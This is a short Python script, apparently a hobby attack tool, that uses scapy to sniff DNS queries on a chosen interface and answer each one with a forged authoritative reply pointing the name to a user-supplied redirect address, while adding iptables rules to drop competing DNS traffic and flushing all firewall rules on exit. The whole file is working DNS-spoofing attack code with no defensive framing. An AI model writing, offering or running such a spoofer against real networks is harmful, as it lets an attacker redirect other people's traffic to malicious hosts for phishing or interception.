#/bin/python
# Program for messing w/ DNS spoofing

import time
import logging
import os, sys
import fcntl
import socket
import struct
import subprocess
from optparse import OptionParser
from scapy.all import *

continue_threads = True
dns_filter = "udp port 53"

class DNS_Spoof():
  def __init__(self, opts):
    self.interface = opts.interface
    self.redirect = opts.redirect

  def spoof_response(self, pkt):
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
      spoofed_pkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)/UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa = 1, qr = 1, an = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 10, rdata = self.redirect))
      send(spoofed_pkt, verbose=0)



def main():

  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # Option for interface to listen on
  optp.add_option("-i", "--interface", dest="interface",
                  help="The network interface to listen on")
  # Option for where to redirect DNS response to
  optp.add_option("-r", "--redirect", dest="redirect",
                  help="The location the DNS response redirects to")

  opts, args = optp.parse_args()

  if opts.interface is None:
    opts.interface = input("Which interface do you want to use: ")
  if opts.redirect is None:
    opts.redirect = input("Where would you like to redirect the request to: ")

  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')


  # Main Event Execution:
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', opts.interface[:15].encode())
    ip_addr = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915, ifreq)[20:24])
    subprocess.run(["iptables", "-A", "INPUT", "-i", opts.interface, "-p", "udp", "--dport", "53", "-s", ip_addr, "-j", "ACCEPT"], check=True)
    subprocess.run(["iptables", "-A", "INPUT", "-i", opts.interface, "-p", "udp", "--dport", "53", "-j", "DROP"], check=True)

    new_spoof = DNS_Spoof(opts)
    while True:
      sniff(filter = dns_filter, iface = opts.interface, store = 0, prn = new_spoof.spoof_response)

  except (KeyboardInterrupt, EOFError) as e:
    subprocess.run(["iptables", "--flush"], check=False)
    print("All done!")
    exit(0)


if __name__ == '__main__':
  main()
